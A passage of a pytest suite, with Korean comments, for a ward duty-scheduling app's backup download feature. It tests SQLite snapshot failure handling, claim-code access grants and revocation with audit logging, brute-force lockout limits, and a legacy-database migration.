            if str(sql).strip().upper().startswith("VACUUM INTO"):
                raise sqlite3.OperationalError(vacuum_error)
            return super().execute(sql, *args, **kwargs)

        def backup(self, *args, **kwargs):
            calls.append(1)
            return super().backup(*args, **kwargs)

    class _Mod:
        def __getattr__(self, name):
            return getattr(sqlite3, name)

        def connect(self, *args, **kwargs):
            kwargs.setdefault("factory", _Conn)
            return sqlite3.connect(*args, **kwargs)

    return _Mod()


def test_disk_full_is_propagated_without_retrying_fallback(client, owner_ok, monkeypatch, env):
    """디스크 풀은 폴백을 재시도하지 않고 **즉시 전파**한다(I/O 두 배 방지)."""
    import app.backup as backup

    calls: list = []
    monkeypatch.setattr(backup, "sqlite3", _sqlite_proxy("database or disk is full", calls))
    before_tmp, before_db = _files_under(env.tmp_dir), _files_under(env.db_dir)

    r = client.get(BACKUP_URL, headers=_h(owner_ok["token"]))
    assert r.status_code == 500, f"디스크 풀인데 {r.status_code}"
    assert calls == [], f"디스크 풀에서 폴백 백업을 {len(calls)}회 시도했다"
    assert _log_rows()[-1]["status"] == "fail", _log_rows()
    _assert_no_leftovers(env, before_tmp, before_db, where="(디스크 풀 경로)")


def test_lock_error_falls_back_and_succeeds(client, owner_ok, monkeypatch):
    """잠금(‘database is locked’)일 때는 폴백을 시도해 백업을 완성한다."""
    import app.backup as backup

    calls: list = []
    monkeypatch.setattr(backup, "sqlite3", _sqlite_proxy("database is locked", calls))
    r, _ = _download(client, owner_ok)
    assert calls, "잠금인데 폴백(Connection.backup)을 시도하지 않았다"
    zf = _zip_of(r)
    assert "duty.db" in zf.namelist() and _csv_names(zf) == EXPECTED_CSV_TABLES


def test_snapshot_deadline_stops_and_leaves_nothing(client, owner_ok, monkeypatch, env):
    """잠긴 DB에서 무한 대기하지 않는다 — 데드라인 초과 시 실패 + 잔여물 0."""
    import app.backup as backup

    assert backup.SNAPSHOT_TIMEOUT_SEC == 30, \
        f"데드라인 기본값이 기준(30초)과 다름: {backup.SNAPSHOT_TIMEOUT_SEC}"
    monkeypatch.setattr(backup, "SNAPSHOT_TIMEOUT_SEC", 2)
    monkeypatch.setattr(backup, "SNAPSHOT_BUSY_TIMEOUT_MS", 500)
    before_tmp, before_db = _files_under(env.tmp_dir), _files_under(env.db_dir)

    locker = sqlite3.connect(os.environ["DUTY_DB"], timeout=5)
    try:
        locker.execute("PRAGMA locking_mode=EXCLUSIVE")
        locker.execute("BEGIN IMMEDIATE")
        locker.execute(
            "INSERT INTO feedback (ward, from_email, from_name, message, created_at) "
            "VALUES (?,?,?,?,?)",
            ("61", STAFF.email, "가명제보자", "잠금유지",
             datetime.now(timezone.utc).isoformat()))

        result: dict = {}

        def _run():
            started = time.monotonic()
            try:
                backup._build_zip()
                result["returned"] = "성공(ZIP 생성)"
            except Exception as exc:  # noqa: BLE001
                result["exc"] = exc
            result["elapsed"] = time.monotonic() - started

        worker = threading.Thread(target=_run, daemon=True)
        worker.start()
        worker.join(timeout=25)
        alive = worker.is_alive()
    finally:
        locker.rollback()
        locker.close()

    assert not alive, "데드라인 2초인데 25초가 지나도 스냅샷이 끝나지 않음(무한 대기)"
    assert "exc" in result, f"잠긴 DB인데 스냅샷이 {result.get('returned')!r}로 끝남"
    assert result["elapsed"] < 25, f"{result['elapsed']:.1f}초 걸림"
    _assert_no_leftovers(env, before_tmp, before_db, where="(타임아웃 경로)")


def test_locked_db_request_never_reports_success(client, owner_ok, monkeypatch, env):
    """스냅샷이 잠금으로 실패하면 HTTP 응답도 성공이 아니고 이력도 `ok`가 아니다."""
    import app.backup as backup

    monkeypatch.setattr(backup, "SNAPSHOT_TIMEOUT_SEC", 2)
    monkeypatch.setattr(backup, "SNAPSHOT_BUSY_TIMEOUT_MS", 500)
    before_tmp, before_db = _files_under(env.tmp_dir), _files_under(env.db_dir)
    real_snapshot = backup._snapshot

    def _locked_snapshot(dest_path):
        """스냅샷 시점에만 DB를 배타 잠금한다(인증은 통과시키기 위해)."""
        locker = sqlite3.connect(os.environ["DUTY_DB"], timeout=5)
        try:
            locker.execute("PRAGMA locking_mode=EXCLUSIVE")
            locker.execute("BEGIN IMMEDIATE")
            locker.execute(
                "INSERT INTO feedback (ward, from_email, from_name, message, created_at) "
                "VALUES (?,?,?,?,?)",
                ("61", STAFF.email, "가명제보자", "잠금유지",
                 datetime.now(timezone.utc).isoformat()))
            return real_snapshot(dest_path)
        finally:
            locker.rollback()
            locker.close()

    monkeypatch.setattr(backup, "_snapshot", _locked_snapshot)
    started = time.monotonic()
    r = client.get(BACKUP_URL, headers=_h(owner_ok["token"]))
    elapsed = time.monotonic() - started

    assert r.status_code == 500, f"잠긴 DB인데 {r.status_code} (본문 {r.content[:8]!r})"
    assert r.content[:2] != b"PK", "잠긴 상태에서 ZIP이 나옴"
    assert elapsed < 25, f"데드라인 2초인데 {elapsed:.1f}초 걸림"
    rows = _log_rows()
    assert rows and rows[-1]["status"] == "fail", f"타임아웃이 fail로 기록되지 않음: {rows}"
    assert not [x for x in rows if x["status"] == "ok"], f"실패인데 ok 행이 있음: {rows}"
    _assert_no_leftovers(env, before_tmp, before_db, where="(타임아웃 HTTP 경로)")


def test_shrink_header_warns_when_backup_suddenly_gets_smaller(client, owner_ok):
    """직전 `ok` 대비 크기가 급감하면 `X-Backup-Shrink: 1` 경고(볼륨 미마운트 탐지)."""
    conn = _db()
    try:
        conn.executemany(
            "INSERT INTO feedback (ward, from_email, from_name, message, created_at) "
            "VALUES (?,?,?,?,?)",
            [("61", STAFF.email, "가명제보자", secrets.token_hex(400),
              datetime.now(timezone.utc).isoformat()) for _ in range(500)])
        conn.commit()
    finally:
        conn.close()

    first, bid = _download(client, owner_ok)
    assert first.headers.get("x-backup-shrink") == "0", "첫 백업에 급감 경고가 붙었다"
    assert _confirm(client, owner_ok, bid, len(first.content)).status_code == 200

    conn = _db()
    try:  # 볼륨을 잃은 상황 = 데이터가 사라진 DB
        conn.execute("DELETE FROM feedback")
        conn.commit()
    finally:
        conn.close()

    second, _ = _download(client, owner_ok)
    assert len(second.content) * 10 < len(first.content), (
        f"테스트 자기검증 실패: 크기가 충분히 줄지 않음 "
        f"({len(first.content)} → {len(second.content)})")
    assert second.headers.get("x-backup-shrink") == "1", (
        f"크기가 {len(first.content)}→{len(second.content)}로 급감했는데 경고가 없다: "
        f"{dict(second.headers)}")
    assert int(second.headers.get("x-backup-prev-bytes", 0)) == len(first.content)


@pytest.mark.parametrize("round_no", [2, 3])
def test_restored_backup_has_no_success_history(client, owner_ok, tmp_path, monkeypatch,
                                                round_no):
    """복구본에는 성공 이력이 없어야 한다 — 2회차·3회차 백업본으로 복구해도 critical.

    스냅샷 안의 `ok` 행은 `archived`로 치환된다. 그러지 않으면 복구 직후(백업이 가장
    필요한 순간)에 "며칠 전에 백업했음"이라며 경고가 침묵한다.
    """
    for _ in range(round_no - 1):
        _full_backup(client, owner_ok)
    assert _status(client, owner_ok)["level"] == "ok", "회차 준비 실패"

    last, _bid = _download(client, owner_ok)
    zf = _zip_of(last)
    restored = _extract_db(zf, tmp_path, name=f"restored{round_no}.db")

    conn = sqlite3.connect(restored)
    conn.row_factory = sqlite3.Row
    try:
        rows = [dict(r) for r in conn.execute("SELECT status FROM backup_log")]
    finally:
        conn.close()
    assert rows, "복구본에 backup_log 행이 하나도 없다(언제 뜬 백업인지 알 수 없다)"
    assert not [r for r in rows if r["status"] == "ok"], \
        f"복구본에 성공 이력이 남아 있다: {rows}"
    assert [r for r in rows if r["status"] == "archived"], \
        f"이전 성공 이력이 archived로 보존되지 않았다: {rows}"

    # 실제로 이 파일로 복구했다고 가정하고 서버 상태를 본다.
    monkeypatch.setenv("DUTY_DB", restored)
    body = _status(client, owner_ok)
    assert body["level"] == "critical", f"복구 직후인데 경고가 꺼져 있다: {body}"
    assert body["last_backup_at"] is None, body


# ==================== 화면 계약 (정적) ====================
#
# 실제 렌더링·중복 클릭·모달 흐름은 실브라우저 E2E(tests/e2e/)에서 확인한다.
# 여기서는 브라우저 없이도 깨지면 바로 알아야 하는 **계약**만 고정한다.

INDEX_HTML = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                          "app", "static", "index.html")


def _index_source() -> str:
    with open(INDEX_HTML, encoding="utf-8") as f:
        return f.read()


def test_uid_card_is_gone_from_screen_and_token():
    """🆔 내 계정 번호 카드는 제거됐다 — 있으면 결함(D-19로 쓸모가 사라졌다)."""
    from app.auth import TokenResponse

    src = _index_source()
    assert "내 계정 번호" not in src, "제거된 🆔 내 계정 번호 카드가 아직 화면에 있다"
    assert "🆔" not in src, "🆔 카드 잔재가 남아 있다"
    assert "uid" not in TokenResponse.model_fields, \
        f"로그인 응답이 아직 uid를 내려준다: {sorted(TokenResponse.model_fields)}"


def test_screen_has_claim_card_and_backup_card_paths():
    """등록 카드(🔐)·백업 카드(💾)·확인 모달·재시도 문구가 화면 코드에 존재한다."""
    src = _index_source()
    for needle in ("backupClaimBox", "🔐 백업 권한 등록", "/api/admin/backup/claim",
                   "backupBox", "💾 백업 내려받기", "backupModal",
                   "확인했습니다", "파일이 없습니다", "다시 시도",
                   "확인하지 못했습니다"):
        assert needle in src, f"화면 코드에 '{needle}' 이 없다"


def test_screen_never_exposes_the_claim_code_value():
    """권한 코드 실값이 화면 코드에 박혀 있으면 안 된다(입력받아 서버로 보낼 뿐)."""
    src = _index_source()
    assert "DUTY_BACKUP_CLAIM_CODE" not in src, "화면 코드에 권한 코드 환경변수 이름/값이 있다"
    m = re.search(r"<input[^>]*id=\"claimCode\"[^>]*>", src)
    assert m, "권한 코드 입력(#claimCode)이 화면에 없다"
    assert 'type="password"' in m.group(0), \
        f"권한 코드 입력이 password 입력이 아니다(어깨너머 노출): {m.group(0)}"


# ==================== 마이그레이션 회귀 (레거시 DB 기동) ====================

def test_legacy_database_without_backup_owner_column_boots(client, env, tmp_path, monkeypatch):
    """`backup_owner` 컬럼이 없는 **옛 DB**가 기동만으로 올라온다(재구축 없이).

    올라온 뒤에는 아무에게도 권한이 없고(플래그 기본 0), 코드로 1회 등록하면 열린다.
    """
    import hashlib

    legacy = tmp_path / "dbdir" / "legacy.db"
    conn = sqlite3.connect(str(legacy))
    try:
        conn.execute(
            """CREATE TABLE users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                empno TEXT UNIQUE, email TEXT UNIQUE, name TEXT NOT NULL,
                role TEXT NOT NULL, ward TEXT DEFAULT '',
                pw_hash TEXT NOT NULL, salt TEXT NOT NULL,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP)""")
        conn.execute("CREATE TABLE ward_invites (ward TEXT PRIMARY KEY, code TEXT UNIQUE)")
        salt = secrets.token_bytes(16)
        pw_hash = hashlib.scrypt(b"password123", salt=salt, n=2**14, r=8, p=1).hex()
        conn.execute(
            "INSERT INTO users (empno, email, name, role, ward, pw_hash, salt) "
            "VALUES (?,?,?,?,?,?,?)",
            ("990900", "legacy@duty.kr", "가명옛계정", "master", "61", pw_hash, salt.hex()))
        conn.execute("INSERT INTO ward_invites (ward, code) VALUES ('61','LEGACY01')")
        conn.commit()
    finally:
        conn.close()

    monkeypatch.setenv("DUTY_DB", str(legacy))
    old_code = _new_claim_code()
    monkeypatch.setenv(CLAIM_ENV, old_code)

    logged_in = _login(client, "990900")
    assert logged_in["role"] == "master", logged_in

    cols = {r[1] for r in sqlite3.connect(str(legacy)).execute("PRAGMA table_info(users)")}
    assert "backup_owner" in cols, f"기동만으로 컬럼이 추가되지 않음: {sorted(cols)}"

    assert client.get(BACKUP_URL, headers=_h(logged_in["token"])).status_code == 403, \
        "마이그레이션 직후 아무 계정에나 권한이 붙었다"
    _grant(client, logged_in, old_code)
    r = client.get(BACKUP_URL, headers=_h(logged_in["token"]))
    assert r.status_code == 200 and r.content[:2] == b"PK", r.status_code


# ==================================================================
# 품질부 3차 신설(Q-1~Q-4) — 개발부 cefa33a의 새 동작을 지시서 수용 기준에서
# 설계한 검증. 계약(엔드포인트·응답 키)만 구현에서 확인하고 기대값은 전부 기준에서 왔다.
# ==================================================================


def _revoke(client, user, value):
    return client.post(REVOKE_URL, json={"code": value}, headers=_h(user["token"]))


def _fresh_master(client, ward, empno):
    """새 병동을 열어 그 병동 master가 되는 가명 계정 하나."""
    return _reg(client, email=f"m{empno}@duty.kr", empno=empno, name="가명운영자", ward=ward)


# ==================== Q-1. 권한 부여 감사(granted) ====================

def test_claim_success_writes_one_granted_row(client, people, code):
    """claim 성공 시 `status='granted'` 행이 정확히 1개(actor=uid, 크기 0)."""
    _grant(client, people.owner, code)
    granted = _rows_with("granted")
    assert len(granted) == 1, f"granted 행이 1개가 아님: {_log_rows()}"
    row = granted[0]
    assert row["actor"] == f"uid:{_uid_of(people.owner)}", f"actor가 uid 형식이 아님: {row}"
    assert row["byte_size"] == 0, f"granted 행 크기가 0이 아님: {row}"
    for leak in (OWNER.name, OWNER.empno, OWNER.email):
        assert leak not in json.dumps(row, ensure_ascii=False), f"granted 행에 개인정보: {leak}"


def test_granted_row_is_not_counted_as_backup_success(client, people, code):
    """부여 감사행은 **성공한 백업이 아니다** — claim 직후에도 백업 이력이 없으면
    critical 유지. granted를 level에 세면 등록만 하고 백업은 안 했는데 경고가 꺼진다.
    """
    _grant(client, people.owner, code)
    body = _status(client, people.owner)
    assert body["level"] == "critical", f"granted가 level 판정에 세어졌다: {body}"
    assert body["last_backup_at"] is None, body
    assert body["days_since"] is None, body


def test_granted_and_ok_are_independent(client, owner_ok):
    """granted가 있어도 실제 백업(ok)이 서면 level=ok로 넘어가고, granted 행은 그대로.

    두 이력이 서로를 오염시키지 않는지 — granted 1 + ok 1 이 공존한다.
    """
    _full_backup(client, owner_ok)
    assert len(_rows_with("granted")) == 1, _log_rows()
    assert len(_rows_with("ok")) == 1, _log_rows()
    assert _status(client, owner_ok)["level"] == "ok"


# ==================== Q-2. 권한 회수(revoke) ====================

def test_revoke_clears_all_flags_and_logs_revoked(client, people, code):
    """회수는 **모든 계정**의 플래그를 0으로 되돌리고 계정마다 `revoked` 행을 남긴다."""
    _grant(client, people.owner, code)
    _grant(client, people.other, code)      # 두 master가 권한을 들고 있는 상황
    assert _flag_of(people.owner) == 1 and _flag_of(people.other) == 1

    r = _revoke(client, people.owner, code)
    assert r.status_code == 200, f"{r.status_code} {r.text[:200]}"
    assert r.json()["revoked"] == 2, f"회수된 계정 수가 2가 아님: {r.json()}"
    assert _flag_of(people.owner) == 0 and _flag_of(people.other) == 0, "플래그가 남았다"

    revoked_actors = {row["actor"] for row in _rows_with("revoked")}
    expected = {f"uid:{_uid_of(people.owner)}", f"uid:{_uid_of(people.other)}"}
    assert expected <= revoked_actors, \
        f"revoked 행이 계정별로 남지 않음: {revoked_actors} vs {expected}"
    for row in _rows_with("revoked"):
        assert row["byte_size"] == 0
        for leak in (OWNER.name, OWNER.empno, OWNER.email, OTHER.name, OTHER.empno):
            assert leak not in json.dumps(row, ensure_ascii=False), f"revoked 행에 개인정보: {leak}"


def test_revoke_then_previous_owner_is_403(client, people, code):
    """회수 후 이전 담당자는 백업 반출 403(플래그가 꺼졌으므로)."""
    _grant(client, people.owner, code)
    assert client.get(BACKUP_URL, headers=_h(people.owner["token"])).status_code == 200
    assert _revoke(client, people.owner, code).status_code == 200
    r = client.get(BACKUP_URL, headers=_h(people.owner["token"]))
    assert r.status_code == 403, f"회수 후에도 반출이 열려 있다: {r.status_code}"
    assert r.content[:2] != b"PK"


def test_revoke_then_reclaim_succeeds(client, people, code):
    """회수 후 정당한 운영자가 같은 코드로 **재등록**하면 다시 200(회수는 재사용 가능)."""
    _grant(client, people.owner, code)
    assert _revoke(client, people.owner, code).status_code == 200
    assert _flag_of(people.owner) == 0
    _grant(client, people.owner, code)   # 재등록 성공을 단언(_grant 내부)
    assert client.get(BACKUP_URL, headers=_h(people.owner["token"])).status_code == 200


def test_revoke_wrong_code_is_rejected_and_keeps_flags(client, people, code):
    """**잘못된 코드로는 회수 불가**(403) — 플래그는 그대로, revoked 행도 안 생긴다."""
    _grant(client, people.owner, code)
    r = _revoke(client, people.owner, _new_claim_code())
    assert r.status_code == 403, f"틀린 코드로 회수됐다: {r.status_code}"
    assert _flag_of(people.owner) == 1, "틀린 코드 회수가 플래그를 껐다"
    assert _rows_with("revoked") == [], f"틀린 코드인데 revoked 행이 남았다: {_log_rows()}"
    assert client.get(BACKUP_URL, headers=_h(people.owner["token"])).status_code == 200


@pytest.mark.parametrize("who", ["staff", "admin"])
def test_revoke_by_non_master_is_forbidden(client, people, code, who):
    """**마스터가 아닌 계정**은 정답 코드를 알아도 회수 불가 — 플래그 유지."""
    _grant(client, people.owner, code)
    r = _revoke(client, getattr(people, who), code)
    assert r.status_code == 403, f"{who}가 회수에 성공했다: {r.status_code}"
    assert _flag_of(people.owner) == 1, f"{who} 회수 시도가 owner 플래그를 껐다"
    assert _rows_with("revoked") == [], f"{who} 회수 시도가 revoked 행을 남겼다: {_log_rows()}"


def test_revoke_when_code_unset_is_denied(client, people):
    """코드 미설정 상태면 회수 기능도 비활성(fail-closed) — 플래그를 못 건드린다."""
    # 먼저 코드가 있을 때 등록해 두고, 회수 시점엔 코드가 사라진 상황을 만든다.
    import app.backup as backup
    assert not backup.claim_enabled()  # env가 CLAIM_ENV를 지운 상태
    r = _revoke(client, people.owner, "anything-8plus-xyz")
    assert r.status_code == 403, f"코드 미설정인데 회수가 동작했다: {r.status_code}"


# ==================== Q-3. 계정 단위 잠금 · 전역 상한 30 ====================

def test_global_failure_cap_locks_new_accounts(client, people, code):
    """**전역 실패 총량 상한(30)**. 잠금 창이 살아 있는 계정들의 실패 합계가 30에
    닿으면 **아직 한 번도 안 틀린 새 계정**의 시도(정답 코드조차)까지 429로 막힌다.

    계정 축만 잠그면 공격자가 병동을 새로 열어 master를 만들 때마다 5회씩 무한히
    시도할 수 있으므로, 그 우회를 닫는 상한이다.
    """
    import app.backup as backup
    assert backup.CLAIM_GLOBAL_MAX_FAILS == 30, \
        f"전역 상한이 기준(30)과 다름: {backup.CLAIM_GLOBAL_MAX_FAILS}"

    # 마스터 5개 계정이 각자 5회씩 실패 → 합계 25 (<30). 아직 전역 잠금 아님.
    for i in range(5):
        m = _fresh_master(client, ward=f"8{i}", empno=f"9910{i:02d}")
        for _ in range(5):
            assert _claim(client, m, _new_claim_code()).status_code == 403

    # 합계 25 < 30 → 새 계정은 아직 (전역이 아니라) 코드 불일치 403을 받는다(상한 미도달).
    probe = _fresh_master(client, ward="85", empno="991050")
    assert _claim(client, probe, _new_claim_code()).status_code == 403, \
        "합계 25에서 이미 전역 잠금이면 상한이 30보다 낮은 것"
    # probe가 5회를 채워(위 1 + 아래 4) 합계를 30으로 만든다.
    for _ in range(4):
        assert _claim(client, probe, _new_claim_code()).status_code == 403

    # 합계 30 도달 → 완전히 새로운(한 번도 안 틀린) 계정도 **정답 코드로도** 429.
    victim = _fresh_master(client, ward="86", empno="991060")
    r = _claim(client, victim, code)
    assert r.status_code == 429, (
        f"전역 상한 30에 닿았는데 새 계정이 통과했다: {r.status_code} {r.text[:200]}")
    assert _flag_of(victim) == 0, "전역 잠금 중인데 권한이 켜졌다"


# ==================== Q-4. 코드 미설정 기간의 시도도 denied 기록 ====================

def test_claim_without_code_configured_is_logged_denied(client, people):
    """코드 **미설정** 상태의 claim 시도도 `denied`로 남는다(배포 직후 취약기 탐지).

    설정 미비라 등록은 거부(403)되지만, 두드린 사실은 **uid별 하루 1행**으로 합쳐 남긴다.
    """
    import app.backup as backup
    assert not backup.claim_enabled(), "이 테스트는 코드 미설정 상태를 전제한다"

    for _ in range(3):
        r = _claim(client, people.owner, "anything-8plus-xyz")
        assert r.status_code == 403, f"미설정인데 {r.status_code}: {r.text[:200]}"
    actor = f"uid:{_uid_of(people.owner)}"
    mine = [d for d in _rows_with("denied") if d["actor"] == actor]
    assert len(mine) == 1, f"미설정 시도 3회가 {len(mine)}행(1행이어야 함): {_rows_with('denied')}"
    assert mine[0]["byte_size"] == 0
    for leak in (OWNER.name, OWNER.empno, OWNER.email):
        assert leak not in json.dumps(mine[0], ensure_ascii=False), f"denied 행에 개인정보: {leak}"
    assert _flag_of(people.owner) == 0


# ==================== 개발부 4차 회귀 고정(품질부 4차) ====================
# FIX-4·FIX-5 는 4차 리팩터가 6함수를 run_claim_transaction 하나로 통합하며 바꾼
# 동작이다. 순차 수용 기준으로 고정해 통합 과정에서 커버리지가 빠지지 않게 한다.


def test_successful_claim_clears_only_own_denied_rows(client, people, code):
    """등록 성공 시 **본인** denied 이력만 지우고 다른 계정 denied 는 유지한다(FIX-4).

    본인의 미설정기·오타 시도는 침입이 아니라 설정 과정이므로 성공 시점에 지운다.
    남의 거부 이력은 진짜 탐지 대상이라 남긴다 — 지우면 침입 신호가 사라진다.
    """
    # owner 가 먼저 틀린 코드로 denied 1행을 쌓는다(설정 과정의 오타).
    assert _claim(client, people.owner, _new_claim_code()).status_code == 403
    # other(다른 병동 master)도 틀린 코드로 denied 1행(이쪽이 탐지 대상).
    assert _claim(client, people.other, _new_claim_code()).status_code == 403
    owner_actor = f"uid:{_uid_of(people.owner)}"
    other_actor = f"uid:{_uid_of(people.other)}"
    before = {r["actor"] for r in _rows_with("denied")}
    assert owner_actor in before and other_actor in before, f"사전 denied 미형성: {before}"

    # owner 가 정답으로 등록 성공 → owner denied 만 사라진다.
    _grant(client, people.owner, code)
    after = _rows_with("denied")
    after_actors = {r["actor"] for r in after}
    assert owner_actor not in after_actors, f"본인 denied 가 안 지워짐(FIX-4 미동작): {after}"
    assert other_actor in after_actors, f"남의 denied 가 지워짐(FIX-4 과잉 삭제): {after}"


def test_reclaim_does_not_write_duplicate_granted_row(client, people, code):
    """이미 권한이 있는 계정의 **재-claim** 은 granted 감사행을 새로 쌓지 않는다(FIX-5).

    소유자의 반복 등록마다 granted 가 쌓이면 유출 조사에서 "언제 새로 권한이 생겼나"
    신호가 중복 적재로 흐려진다. 재-claim 은 200(멱등)이되 granted 는 1개로 고정.
    """
    _grant(client, people.owner, code)
    assert len(_rows_with("granted")) == 1, _log_rows()
    # 같은 계정이 정답 코드로 여러 번 재등록 — 플래그는 1, granted 는 여전히 1.
    for _ in range(3):
        assert _claim(client, people.owner, code).status_code == 200
    assert _flag_of(people.owner) == 1
    assert len(_rows_with("granted")) == 1, \
        f"재-claim 이 granted 를 중복 적재(FIX-5 미동작): {_rows_with('granted')}"
